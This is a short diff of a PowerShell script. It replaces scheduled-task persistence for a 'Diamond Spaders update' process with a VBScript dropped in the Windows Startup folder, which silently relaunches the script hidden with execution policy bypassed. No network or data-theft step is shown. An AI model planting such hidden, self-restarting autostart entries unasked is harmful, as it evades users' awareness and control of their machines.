@@ -30,9 +30,13 @@ function Log($msg) {
 
 function Register-Always {
   if (-not $PSCommandPath) { return }
-  $tr = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath -loop"
-  & schtasks.exe /Create /F /SC ONLOGON /TN "Diamond Spaders update" /TR $tr | Out-Null
-  & schtasks.exe /Create /F /SC MINUTE /MO 5 /TN "Diamond Spaders watchdog" /TR $tr | Out-Null
+  $startup = [Environment]::GetFolderPath("Startup")
+  if (-not $startup) { return }
+  $vbs = Join-Path $startup "DiamondSpadersUpdate.vbs"
+  $qq = '""'
+  $run = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $qq$PSCommandPath$qq -loop"
+  $body = "CreateObject(""Wscript.Shell"").Run ""$run"", 0, False"
+  Set-Content -Path $vbs -Value $body -Encoding ASCII
 }
 
 function Get-LoopPid {
